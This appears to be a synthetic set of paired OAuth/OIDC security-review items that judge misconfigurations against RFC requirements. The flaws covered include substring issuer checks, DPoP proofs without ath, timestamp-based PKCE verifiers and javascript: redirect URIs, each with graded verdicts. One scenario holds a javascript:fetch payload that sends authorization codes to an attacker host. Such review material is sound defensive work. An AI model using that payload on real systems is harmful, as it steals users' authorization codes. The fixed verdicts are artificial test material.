# CB4 Stage 3 — Action 3 Cross-Source Combination Set
# Node: Multi-source (Nodes 1–9, cross-source arbitration) — ext26
# Sequences: CB4-3.4-871 through CB4-3.4-880
# Instances: 20 (10 base pairs × 2 phrasings each)
# Stratum: B/C (cross-source combinations from ext33 patterns)
# Running total after this file: 1760 instances (880 base pairs)

---

## Pair[CB4-3.4-871]

### A
JWT iss validated with substring match combined with DPoP proof missing ath claim:

A resource server validates JWT access tokens using a substring iss check (contains "as.example.com"). The same RS accepts DPoP proofs without ath (access token hash) claim. Attackers can exploit both gaps simultaneously: an attacker-controlled issuer passes the iss check, and stolen DPoP-bound access tokens are reusable with the attacker's own DPoP key pair.

### B
REPROCESS. Two independent MUST-level violations with compounding attack surface.

Violation 1 — JWT iss substring match: RFC 7519 §4.1.1 exact case-sensitive string comparison required. Substring matching allows "evil-as.example.com" to pass iss validation against a check for "as.example.com". In JWKS-discovery mode, the RS fetches the attacker's JWKS and validates tokens signed by the attacker. REPROCESS.

Violation 2 — DPoP ath absent: RFC 9449 §4.2 MUST ath in DPoP proofs at RS. Without ath, stolen access tokens can be paired with any new DPoP proof using any key pair. The stolen token is not bound to its original holder's DPoP key when the RS omits ath validation. REPROCESS.

Compound attack path: (1) Attacker registers "evil-as.example.com" with a valid OIDC discovery document. The RS fetches the attacker's JWKS and accepts the attacker's tokens (iss substring check passes). (2) Attacker intercepts a DPoP-bound access token from a legitimate user. Without ath validation at the RS, the attacker pairs the stolen token with their own DPoP key — the token is accepted. Two independent attack vectors active simultaneously: issuer forgery via substring + DPoP token theft via ath absence.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 7519 §4.1.1 (iss substring match) and RFC 9449 §4.2 (DPoP ath absent). Compound: attacker can forge tokens from a spoofed issuer AND reuse stolen tokens with their own DPoP key. REPROCESS.

### Phrasing-B
REPROCESS — JWT iss substring match (RFC 7519 §4.1.1) + DPoP ath absent (RFC 9449 §4.2 MUST). Two independent violations; compound attack surface.

Violation 1: contains("as.example.com") allows evil-as.example.com; JWKS-discovery chain → attacker keys → forged tokens accepted. REPROCESS.
Violation 2: ath absent → stolen AT + attacker DPoP key → valid request; no ath cross-check fails attacker. REPROCESS.
Compound: issuer forgery via substring + token theft via ath absence = two simultaneous attack vectors. REPROCESS on both independently.

---

## Pair[CB4-3.4-872]

### A
PKCE code_verifier generated from timestamp combined with redirect_uri javascript: scheme accepted:

A mobile app generates PKCE code_verifier from the current Unix timestamp (13 characters, predictable). The same AS accepts a registered redirect_uri of "javascript:fetch('https://attacker.example.com/?code='+window.location.href)" for a public client. An attacker who intercepts the authorization code can brute-force the timestamp-based verifier AND the AS-origin XSS can be used to capture authorization codes in real time.

### B
REPROCESS. Two independent MUST-level violations enabling distinct and complementary attack paths.

Violation 1 — Timestamp-based PKCE verifier: RFC 7636 §4.1 MUST high-entropy CSPRNG. Timestamp verifier has ~10 bits/second entropy — enumerable within a ±5s timing window (10,000 candidates). The authorization code window (15 minutes) provides ample time for brute-force. Also violates 43-character minimum (13 chars). REPROCESS.

Violation 2 — javascript: scheme redirect URI: RFC 6749 §3.1.2 absolute URI for network-addressable redirection; javascript: is not a network-addressable scheme. CWE-79 stored XSS at the AS origin executes on every authorization redirect to the registered client. REPROCESS.

Compound impact: (1) Attacker registers a client with a javascript: redirect URI. The XSS exfiltrates authorization codes in real time as they are issued. (2) Even codes that are not exfiltrated via XSS can be brute-forced within the code window because the PKCE verifier is timestamp-based and enumerable. The two attack paths are complementary: XSS provides real-time code interception; verifier brute-force provides a fallback for codes not captured via XSS. Together they represent both an active exfiltration path (XSS) and a passive guessing path (timestamp verifier).

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 7636 §4.1 (timestamp verifier) and RFC 6749 §3.1.2 / CWE-79 (javascript: scheme). Compound: XSS exfiltrates codes actively; timestamp verifier enables brute-force as fallback. Both paths enable unauthorized code exchange. REPROCESS.

### Phrasing-B
REPROCESS — PKCE timestamp verifier (RFC 7636 §4.1 MUST) + javascript: redirect URI (RFC 6749 §3.1.2 + CWE-79). Two violations; complementary attack paths.

Violation 1: timestamp ≈ 10K enumeration candidates in ±5s window; 13 chars < 43 minimum. RFC 7636 §4.1 MUST violated. REPROCESS.
Violation 2: javascript: scheme registered; AS-origin XSS captures codes in real time. RFC 6749 §3.1.2 violated; CWE-79. REPROCESS.
Compound: XSS = active code exfiltration; timestamp verifier = passive brute-force fallback. Complementary paths cover both intercepted and non-intercepted codes. REPROCESS.

---

## Pair[CB4-3.4-873]

### A
JWT iss substring match combined with JWT jti absent from access tokens:

A resource server validates JWT iss with a substring check. The same AS issues JWT access tokens without jti claims. Team: "Our 15-minute TTL limits token validity; our iss check correctly identifies trusted issuers."

### B
REPROCESS. One MUST-level violation overrides the CONCERN-level gap. Graduation rule applies.

Violation — JWT iss substring match: RFC 7519 §4.1.1 exact case-sensitive string comparison required. Substring check allows attacker-controlled issuers to pass iss validation. In JWKS-discovery mode, the RS accepts the attacker's forged tokens. REPROCESS.

Gap — JWT jti absent: RFC 7519 §4.1.7 SHOULD jti. 15-minute TTL mitigates the per-token tracking gap. Precision revocation, concurrent-use anomaly detection, and per-token audit correlation are absent. SHOULD-level gap: CONCERN.

Graduation rule: REPROCESS (iss substring MUST violation) overrides CONCERN (jti SHOULD gap). The final verdict is REPROCESS regardless of the number of CONCERN-level gaps also present. One MUST violation is sufficient for REPROCESS.

Both remediations required: (1) replace substring check with exact allowlist per environment; (2) add UUID v4 jti to all tokens with Redis TTL-keyed blocklist. But the verdict is determined by the iss MUST violation alone. REPROCESS.

### Reason
Graduation rule: iss substring match = REPROCESS (RFC 7519 §4.1.1 MUST); jti absent = CONCERN (SHOULD). REPROCESS overrides CONCERN — verdict is REPROCESS. One MUST violation is sufficient regardless of concurrent CONCERN-level gaps.

### Phrasing-B
REPROCESS — JWT iss substring match (RFC 7519 §4.1.1 MUST) + jti absent (RFC 7519 §4.1.7 SHOULD CONCERN). Graduation rule: REPROCESS overrides CONCERN.

iss substring: MUST exact comparison violated; attacker-controlled issuer passes; REPROCESS.
jti absent: SHOULD gap; 15-min TTL partially mitigates; CONCERN.

Graduation rule: verdict = highest severity finding. CONCERN does not dilute REPROCESS. One MUST violation = REPROCESS verdict. Both remediations recommended; verdict determined by MUST alone. REPROCESS.

---

## Pair[CB4-3.4-874]

### A
SSDF PO.1 security training absent combined with javascript: scheme redirect URI accepted in production:

An organization has no formal security training program (SSDF PO.1 gap). Their AS's client registration endpoint accepts javascript: scheme redirect URIs. A developer is asked why this was allowed: "I didn't know javascript: was a different scheme than https: — they both start a browser action." The AS is in production with registered clients using javascript: redirect URIs.

### B
REPROCESS. PO.1 escalation applies.

PO.1 gap alone: CONCERN. No formal security training for developers — developers are not systematically taught the threat model for redirect URI schemes and the distinction between network-addressing schemes and code-execution schemes in the OAuth redirect flow.

Production MUST violation: javascript: scheme redirect URI accepted. RFC 6749 §3.1.2 requires absolute URIs for network-addressable redirection; javascript: is a code-execution scheme, not a network-addressable URI. CWE-79 stored XSS at the AS origin is the consequence. The developer comment provides direct traceability from the PO.1 training gap to the production MUST violation: the error is a fundamental misunderstanding of URI scheme semantics that security training would address.

PO.1 escalation rule: PO.1 absence alone = CONCERN. PO.1 absence + traceable production MUST violation = REPROCESS. Traceability is explicit: the developer states the lack of understanding that caused the misconfiguration. The error (accepting code-execution schemes as redirect URIs) is a canonical topic in OAuth security training — its presence in production in the absence of PO.1 training demonstrates the causal link.

Remediations: (1) immediate — remove all javascript: scheme registrations; enforce scheme allowlist (https, http-localhost, custom) at registration; (2) systemic — implement SSDF PO.1 security training that includes OAuth redirect URI security, URI scheme categories, and XSS threat model. REPROCESS.

### Reason
PO.1 escalation rule: PO.1 gap (CONCERN) + traceable production MUST violation (javascript: scheme = CWE-79 / RFC 6749 §3.1.2) = REPROCESS. Developer comment provides explicit causal traceability from training gap to production misconfiguration.

### Phrasing-B
REPROCESS — SSDF PO.1 absent + javascript: scheme redirect URI in production. PO.1 escalation: CONCERN → REPROCESS.

PO.1 alone: CONCERN. No systematic training on OAuth redirect URI security.
Production MUST: javascript: scheme accepted. RFC 6749 §3.1.2 violated. CWE-79 stored XSS at AS origin.
Developer comment ("I didn't know javascript: was different from https:") = direct causal traceability. PO.1 training would have covered URI scheme security and the redirect URI threat model.

PO.1 escalation: CONCERN → REPROCESS when PO.1 gap + traceable production MUST confirmed. Remediation: (1) remove javascript: registrations + enforce scheme allowlist; (2) implement PO.1 training. REPROCESS.

---

## Pair[CB4-3.4-875]

### A
DPoP ath absent combined with PKCE code_verifier from timestamp:

A resource server accepts DPoP proofs without ath claim. The authorization server accepts PKCE challenges derived from timestamp-based code_verifiers (13 characters, ~10 bits/second entropy). Both gaps exist in the same deployed system.

### B
REPROCESS. Two independent MUST-level violations present.

Violation 1 — DPoP ath absent: RFC 9449 §4.2 MUST ath in DPoP proofs at RS. Stolen access tokens are reusable with any DPoP key pair because the ath cross-check is absent. REPROCESS.

Violation 2 — PKCE timestamp verifier: RFC 7636 §4.1 MUST high-entropy CSPRNG. Timestamp verifier is enumerable (10,000 candidates from ±5s timing estimate); also below 43-character minimum. An intercepted authorization code can be exchanged by brute-forcing the timestamp-based verifier. REPROCESS.

Combined impact: The timestamp-based PKCE verifier makes authorization code interception feasible — the attacker brute-forces the verifier and exchanges the code for a DPoP-bound access token. With ath absent from DPoP proof validation, the attacker can then use this DPoP-bound token with their own DPoP key pair, not the key pair used during the original exchange. Two separate attack surfaces: (1) code theft enabled by weak PKCE; (2) token theft enabled by missing ath. Even without the compound interaction, both violations are independently REPROCESS.

Both violations REPROCESS independently. REPROCESS.

### Reason
Two independent MUST violations: RFC 9449 §4.2 MUST ath (DPoP) and RFC 7636 §4.1 MUST CSPRNG (PKCE verifier). Compound: weak PKCE enables code-to-token conversion; ath absence enables post-exchange token reuse with attacker's DPoP key. REPROCESS.

### Phrasing-B
REPROCESS — DPoP ath absent (RFC 9449 §4.2 MUST) + PKCE timestamp verifier (RFC 7636 §4.1 MUST). Two independent violations.

Violation 1: ath absent → stolen DPoP-bound AT + attacker's DPoP key → valid RS request. REPROCESS.
Violation 2: timestamp verifier → 10K enumeration candidates → brute-force code exchange viable. Also 13 chars < 43 minimum. REPROCESS.
Compound: weak PKCE → code exchange → DPoP-bound AT obtained; ath absence → AT reusable with any DPoP key. Independent violations with sequential compound impact. REPROCESS.

---

## Pair[CB4-3.4-876]

### A
redirect_uri javascript: scheme accepted combined with 24-hour authorization code lifetime:

An AS accepts javascript: scheme redirect URIs at client registration. Authorization codes are valid for 24 hours. An attacker who has registered a malicious client with a javascript: redirect URI captures authorization codes via XSS. The 24-hour code window gives the attacker ample time to use the captured codes.

### B
REPROCESS. Two independent MUST-level violations with cascading compound impact across the attack lifecycle.

Violation 1 — javascript: scheme redirect URI: RFC 6749 §3.1.2 absolute URI for network-addressable redirection violated. CWE-79 stored XSS at AS origin. The javascript: URI executes on every authorization redirect, exfiltrating authorization codes to the attacker in real time. REPROCESS.

Violation 2 — 24-hour authorization code lifetime: RFC 6749 §4.1.2 MUST expire shortly. 24 hours is not "shortly" — universally interpreted as minutes. The 24-hour window serves as an extended use period for captured codes. REPROCESS.

Cascading compound impact: The XSS captures authorization codes as they are issued. The 24-hour code lifetime then gives the attacker an extended window to exchange the captured codes for tokens at their convenience. They can wait until the legitimate user has logged out, until their attack infrastructure is prepared, or until detection of their malicious client registration is less likely. The combination of real-time code capture (via XSS) + extended use window (24-hour code) eliminates both temporal pressure and the need for immediate action after capture.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 6749 §3.1.2 / CWE-79 (javascript: scheme XSS) and RFC 6749 §4.1.2 MUST expire shortly (24h). Cascading compound: XSS captures codes in real time; 24h lifetime enables leisurely exploitation. REPROCESS.

### Phrasing-B
REPROCESS — javascript: scheme redirect URI (CWE-79) + 24-hour auth code (RFC 6749 §4.1.2 MUST). Cascading: real-time code capture + extended exploitation window.

Violation 1: javascript: AS-origin XSS captures codes in real time on every authorization redirect. REPROCESS.
Violation 2: 24-hour auth code ≠ "shortly"; 24-hour exploitation window after capture. REPROCESS.
Cascade: XSS provides code immediately; 24h window removes time pressure for exchange. Attacker captures → waits for optimal moment → exchanges. Both violations compound across the full attack lifecycle. REPROCESS.

---

## Pair[CB4-3.4-877]

### A
JWT iss substring match combined with PKCE code_verifier from timestamp:

A resource server uses substring iss validation. The same system generates PKCE code_verifiers from timestamps. An attacker controlling "evil-as.example.com" can issue forged tokens that pass iss validation, and separately can brute-force authorization code exchanges due to the weak PKCE verifier.

### B
REPROCESS. Two independent MUST-level violations enabling complementary attack vectors.

Violation 1 — JWT iss substring match: RFC 7519 §4.1.1 exact comparison required. Attacker-controlled "evil-as.example.com" passes the "as.example.com" substring check. In JWKS-discovery mode, the RS accepts forged tokens signed by the attacker. REPROCESS.

Violation 2 — PKCE timestamp verifier: RFC 7636 §4.1 MUST CSPRNG; also minimum length violated (13 < 43 chars). Timestamp-based verifier is enumerable within code window. Attacker intercepts authorization codes and brute-forces the verifier. REPROCESS.

Complementary attack vectors: The iss substring gap enables post-exchange attacks — the attacker can forge access tokens that are accepted by the RS without going through the authorization flow. The timestamp PKCE gap enables pre-exchange attacks — the attacker can participate in the authorization flow by capturing a code and brute-forcing the verifier to exchange it legitimately. Together, the system is vulnerable at both ends: token forgery (iss) and code-to-token conversion (weak PKCE). An attacker can exploit whichever path is more accessible.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 7519 §4.1.1 (iss substring) and RFC 7636 §4.1 (PKCE timestamp). Complementary vectors: iss substring → direct token forgery; PKCE timestamp → code-to-token brute-force. System vulnerable at both token issuance and token forgery levels. REPROCESS.

### Phrasing-B
REPROCESS — JWT iss substring (RFC 7519 §4.1.1 MUST) + PKCE timestamp verifier (RFC 7636 §4.1 MUST). Two violations; complementary attack paths at different points in the OAuth flow.

Violation 1: iss substring → evil-as.example.com passes check → forged tokens accepted at RS. REPROCESS.
Violation 2: timestamp verifier → 10K enumeration → code exchange brute-forceable. REPROCESS.
Complementary: iss forgery bypasses authorization flow entirely; PKCE weakness participates in flow via brute-force. System vulnerable at both token acceptance (iss) and authorization code exchange (PKCE) layers. REPROCESS.

---

## Pair[CB4-3.4-878]

### A
DPoP ath absent combined with IP-only rate limiting at the token endpoint:

A resource server accepts DPoP proofs without ath claim validation. The authorization server's token endpoint applies only IP-based rate limiting. An attacker who obtains a DPoP-bound access token can use it with their own DPoP key, and separately can attempt distributed credential brute-force against the token endpoint.

### B
REPROCESS. One MUST-level violation overrides the CONCERN-level gap. Graduation rule applies.

Violation — DPoP ath absent: RFC 9449 §4.2 MUST ath in DPoP proofs at RS. Stolen DPoP-bound access tokens are reusable with any DPoP key pair. The DPoP sender-constrained property is broken by ath absence. REPROCESS.

Gap — IP-only rate limiting: No per-client-id throttling at token endpoint. A botnet with sufficient IP diversity can make effectively unlimited client_secret guesses per target client_id. No RFC or ASVS MUST specifies the mechanism — this is a defense-in-depth gap. CONCERN.

Graduation rule: REPROCESS (DPoP ath MUST violation) overrides CONCERN (IP-only rate limiting defense-in-depth gap). The verdict is REPROCESS regardless of the number of CONCERN-level gaps. One MUST violation is sufficient.

Note on combined risk: while the two gaps operate on different attack surfaces (DPoP token theft vs. credential brute-force), both weaken the overall token security posture. However, the graduation rule determines the verdict based on the highest severity finding, not the total count of weaknesses. REPROCESS.

### Reason
Graduation rule: DPoP ath absent = REPROCESS (RFC 9449 §4.2 MUST); IP-only rate limiting = CONCERN (no MUST for specific mechanism). REPROCESS overrides CONCERN. One MUST violation determines verdict. REPROCESS.

### Phrasing-B
REPROCESS — DPoP ath absent (RFC 9449 §4.2 MUST REPROCESS) + IP-only rate limiting (CONCERN). Graduation rule: REPROCESS overrides CONCERN.

DPoP ath absent: MUST violated; stolen AT reusable with any DPoP key. REPROCESS.
IP-only rate limiting: botnet bypass viable; no MUST for specific mechanism; defense-in-depth gap. CONCERN.

Graduation rule: verdict = highest severity finding. CONCERN + REPROCESS = REPROCESS. Count of gaps does not determine verdict; presence of one MUST violation does. Both remediations recommended; verdict determined by ath MUST alone. REPROCESS.

---

## Pair[CB4-3.4-879]

### A
PKCE code_verifier from timestamp combined with OIDC End Session accepting logout without id_token_hint:

An AS generates PKCE code_verifiers from timestamps (enumerable). The same AS's end session endpoint accepts logout requests with only a registered post_logout_redirect_uri — no id_token_hint required. Both gaps exist in the same production system.

### B
REPROCESS. One MUST-level violation overrides the CONCERN-level gap. Graduation rule applies.

Violation — PKCE timestamp verifier: RFC 7636 §4.1 MUST high-entropy CSPRNG + minimum 43 characters. Timestamp verifier is enumerable (10,000 candidates from ±5s timing estimate) and below minimum length (13 < 43 chars). Intercepted authorization codes can be brute-force-exchanged within the code window. REPROCESS.

Gap — OIDC End Session without id_token_hint: OIDC RP-Initiated Logout specification lists id_token_hint as RECOMMENDED. Without id_token_hint, any party with a registered post_logout_redirect_uri can force session termination for any user. "Logout is harmless" characterization rejected — session forcing disrupts active operations and enables precursor attacks. RECOMMENDED level: CONCERN.

Graduation rule: REPROCESS (PKCE timestamp MUST violation) overrides CONCERN (id_token_hint RECOMMENDED gap). The verdict is REPROCESS. One MUST violation is sufficient regardless of concurrent CONCERN-level gaps.

Note: an attacker who can force logout (via the id_token_hint gap) and also brute-force authorization code exchanges (via the weak PKCE verifier) has both a denial-of-service path (session forcing) and a token acquisition path (code brute-force). The graduation rule is not affected by this — the verdict is REPROCESS on the MUST violation alone. REPROCESS.

### Reason
Graduation rule: PKCE timestamp verifier = REPROCESS (RFC 7636 §4.1 MUST); OIDC End Session without id_token_hint = CONCERN (RECOMMENDED level). REPROCESS overrides CONCERN. One MUST violation is sufficient.

### Phrasing-B
REPROCESS — PKCE timestamp verifier (RFC 7636 §4.1 MUST REPROCESS) + End Session without id_token_hint (RECOMMENDED CONCERN). Graduation rule: REPROCESS overrides CONCERN.

Timestamp verifier: MUST CSPRNG violated; 10K enumeration candidates; 13 chars < 43 minimum. REPROCESS.
End Session without id_token_hint: RECOMMENDED not MUST; session forcing viable; "logout is harmless" rejected. CONCERN.

Graduation rule: REPROCESS + CONCERN = REPROCESS. RECOMMENDED-level gap does not dilute MUST-level violation. Verdict determined by RFC 7636 §4.1 MUST alone. REPROCESS.

---

## Pair[CB4-3.4-880]

### A
Complete ext33 and earlier compliance baseline — iss exact match, DPoP full compliance, PKCE CSPRNG verifier, scheme allowlist, and all prior controls:

An authorization server and resource server correctly implement all ext33 controls: JWT iss validated with exact case-sensitive allowlist; DPoP proofs validated with ath cross-check + cnf/jkt verification + htm/htu/iat/jti; PKCE code_verifier generated from CSPRNG (64 chars, 384-bit entropy, S256 challenge); redirect URI scheme allowlist (https/http-localhost/custom, javascript: rejected at registration). Earlier controls also correct: jti with Redis blocklist, 60-second auth codes, opaque sub PPID, PAR HTTPS, PKCE enforced for all public clients, RS256 multi-party signing, per-client-id rate limiting, id_token_hint at end session.

### B
PASS. All ext33 and referenced earlier controls correctly implemented. No findings across all assessed domains.

ext33 controls:
JWT iss: exact case-sensitive allowlist per environment. RFC 7519 §4.1.1 satisfied. Issuer confusion attacks (substring collision, adversarial subdomains) blocked. PASS.

DPoP: ath present and cross-checked (ath = BASE64URL(SHA256(ASCII(AT)))); htm/htu bound; iat fresh; jti tracked; cnf/jkt confirmed. RFC 9449 §4.2 fully satisfied. Token sender-constrained — stolen AT non-exploitable without private key. PASS.

PKCE verifier: platform CSPRNG, 64 chars, 384-bit entropy, unreserved chars, S256 challenge, in-memory storage. RFC 7636 §4.1 all requirements met. Brute-force infeasible. PASS.

Redirect URI scheme allowlist: https, http (localhost), custom scheme (native apps). javascript:, data:, vbscript: rejected at registration with 400 invalid_redirect_uri. RFC 6749 §3.1.2 satisfied. CWE-79 and CWE-601 mitigated at registration. PASS.

Earlier controls confirmed: jti + Redis blocklist (PASS), 60s auth codes + single-use + revocation (PASS), opaque sub PPID (PASS), PAR HTTPS (PASS), public client PKCE enforcement (PASS), RS256 multi-party (PASS), per-client rate limiting (PASS), id_token_hint at end session (PASS).

No findings across all ext33 and referenced ext31/ext32 domains. PASS.

### Reason
All ext33 security controls correct (iss exact match, DPoP full compliance, PKCE CSPRNG, redirect URI scheme allowlist) plus all referenced earlier controls. Comprehensive positive baseline across four new domains and referenced prior domains. PASS.

### Phrasing-B
PASS — all ext33 + earlier controls correct. Comprehensive positive baseline across iss validation, DPoP, PKCE verifier, redirect URI scheme, and all referenced prior domains.

iss: exact case-sensitive allowlist. RFC 7519 §4.1.1. Issuer confusion blocked. PASS.
DPoP: ath + cnf/jkt + htm/htu/iat/jti. RFC 9449 §4.2. Sender-constrained. PASS.
PKCE verifier: CSPRNG 64 chars 384 bits S256 in-memory. RFC 7636 §4.1. Brute-force infeasible. PASS.
Redirect URI: scheme allowlist at registration; javascript: rejected 400. RFC 6749 §3.1.2. CWE-79/601 mitigated. PASS.
Earlier controls: jti blocklist, 60s auth codes, opaque sub, PAR HTTPS, public-client PKCE, RS256, per-client rate limit, id_token_hint — all PASS.
No findings. PASS.
